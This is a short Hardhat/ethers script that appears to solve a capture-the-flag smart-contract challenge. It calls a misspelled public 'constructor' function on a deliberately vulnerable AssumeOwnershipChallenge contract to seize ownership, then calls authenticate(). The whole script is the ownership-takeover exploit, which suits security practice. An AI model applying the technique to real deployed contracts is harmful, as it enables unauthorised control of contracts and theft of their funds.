async function main() {
    Challenge = await ethers.getContractFactory('AssumeOwnershipChallenge');
    challenge = await Challenge.attach('0xD112709F8786a75EfeA7d67CA25B598CC549BB67');
    
    tx = await challenge.AssumeOwmershipChallenge();
    await tx.wait();
    tx = await challenge.authenticate();
    await tx.wait();
}
main()
  .then(() => process.exit(0))
  .catch((error) => {
      console.error(error);
      process.exit(1);
  })